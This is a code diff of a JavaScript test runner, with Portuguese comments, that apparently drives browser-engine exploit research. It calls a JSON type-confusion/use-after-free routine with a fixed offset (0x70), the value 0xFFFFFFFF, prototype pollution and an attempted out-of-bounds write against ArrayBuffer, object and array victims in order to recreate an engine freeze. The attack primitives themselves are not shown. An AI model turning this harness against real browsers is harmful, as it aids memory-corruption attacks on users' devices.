@@ -1,65 +1,68 @@
 // js/script3/runAllAdvancedTestsS3.mjs
-import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
+import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
+import { runJsonTCDetailedAccessTest } from './testJsonTypeConfusionUAFSpeculative.mjs'; // Nova importação
 
-import { runSpecificJsonTypeConfusionTest } from './testJsonTypeConfusionUAFSpeculative.mjs';
-// Adicione outras importações de teste do script3 se necessário
-// import { testWebAssemblyInterface } from './testWebAssemblyInterface.mjs';
-// ...
+async function runFocusedTest_RecreateFreeze_DetailedAccess() {
+    const FNAME_RUNNER = "runFocusedTest_RecreateFreeze_DetailedAccess";
+    logS3(`==== INICIANDO TESTE DIRECIONADO (Recriar Congelamento com Acesso Detalhado em toJSON) ====`, 'test', FNAME_RUNNER);
 
-async function runGranularOffsetTests_around_0x70() {
-    const FNAME_RUNNER = "runGranularOffsetTests_around_0x70";
-    logS3(`==== INICIANDO TESTES DIRECIONADOS JSON TC (Variação Granular de Offset em torno de 0x70) ====`, 'test', FNAME_RUNNER);
-
-    const baseOffset = 0x70;
-    const offsetsToTest = [
-        baseOffset - 4, // 0x6C
-        baseOffset - 3, // 0x6D
-        baseOffset - 2, // 0x6E
-        baseOffset - 1, // 0x6F
-        baseOffset,     // 0x70
-        baseOffset + 1, // 0x71
-        baseOffset + 2, // 0x72
-        baseOffset + 3, // 0x73
-        baseOffset + 4  // 0x74
-    ];
-    const valueToWrite = 0xFFFFFFFF; // Valor crítico
+    const criticalOffset = 0x70;
+    const criticalValue = 0xFFFFFFFF;
     const enablePP = true;
     const attemptOOBWrite = true;
-    const skipOOBEnvSetup = false; // Queremos o ambiente OOB para cada teste
 
-    for (const offset of offsetsToTest) {
-        const description = `GranularOffset_0x${offset.toString(16)}_Val_FFFF_PP_SimpleToJSON_MinLog`;
-        await runSpecificJsonTypeConfusionTest(
-            description,
-            offset,
-            valueToWrite,
-            enablePP,
-            attemptOOBWrite,
-            skipOOBEnvSetup
-        );
-        await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa entre cada teste de offset
-    }
+    // Cenário 1: victim_ab é ArrayBuffer (como nos testes originais do congelamento)
+    logS3(`\n--- Testando com victim_ab: ArrayBuffer ---`, 'subtest', FNAME_RUNNER);
+    await runJsonTCDetailedAccessTest(
+        "FreezeAttempt_VictimArrayBuffer_0x70_FFFF",
+        criticalOffset,
+        criticalValue,
+        enablePP,
+        attemptOOBWrite,
+        () => new ArrayBuffer(64) // victimFactory para ArrayBuffer
+    );
+    await PAUSE_S3(MEDIUM_PAUSE_S3);
 
-    logS3(`==== TESTES DIRECIONADOS JSON TC (Variação Granular de Offset) CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
+    // Cenário 2: victim_ab é um Objeto Simples
+    logS3(`\n--- Testando com victim_ab: Objeto Simples ---`, 'subtest', FNAME_RUNNER);
+    await runJsonTCDetailedAccessTest(
+        "FreezeAttempt_VictimSimpleObject_0x70_FFFF",
+        criticalOffset,
+        criticalValue,
+        enablePP,
+        attemptOOBWrite,
+        () => ({ p1: "a", p2: "b", p3: 123 }) // victimFactory para Objeto
+    );
+    await PAUSE_S3(MEDIUM_PAUSE_S3);
+
+    // Cenário 3: victim_ab é um Array Simples
+    logS3(`\n--- Testando com victim_ab: Array Simples ---`, 'subtest', FNAME_RUNNER);
+    await runJsonTCDetailedAccessTest(
+        "FreezeAttempt_VictimSimpleArray_0x70_FFFF",
+        criticalOffset,
+        criticalValue,
+        enablePP,
+        attemptOOBWrite,
+        () => [10, 20, 30, 40, 50] // victimFactory para Array
+    );
+    await PAUSE_S3(MEDIUM_PAUSE_S3);
+
+    logS3(`==== TESTE DIRECIONADO (Recriar Congelamento com Acesso Detalhado em toJSON) CONCLUÍDO ====`, 'test', FNAME_RUNNER);
 }
 
-
 export async function runAllAdvancedTestsS3() {
-    const FNAME = 'runAllAdvancedTestsS3_FocusGranularOffset';
+    const FNAME = 'runAllAdvancedTestsS3_DetailedAccessFreezeAttempt';
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
     if (runBtn) runBtn.disabled = true;
     if (outputDiv) outputDiv.innerHTML = '';
 
-    logS3(`==== INICIANDO Script 3: Foco JSON TC (Variação Granular de Offset) ====`,'test', FNAME);
+    logS3(`==== INICIANDO Script 3: Tentativa de Recriar Congelamento com Acesso Detalhado em toJSON ====`,'test', FNAME);
     
-    await runGranularOffsetTests_around_0x70();
-
-    // Outros testes do Script 3 podem ser adicionados ou descomentados aqui se necessário
-    // logS3("Outros testes do Script 3 (se houver) seriam executados agora...", "info", FNAME);
-
-    logS3(`\n==== Script 3 CONCLUÍDO (Foco JSON TC - Variação Granular de Offset) ====`,'test', FNAME);
+    await runFocusedTest_RecreateFreeze_DetailedAccess();
+    
+    logS3(`\n==== Script 3 CONCLUÍDO (Tentativa de Recriar Congelamento com Acesso Detalhado em toJSON) ====`,'test', FNAME);
     if (runBtn) runBtn.disabled = false;
 }
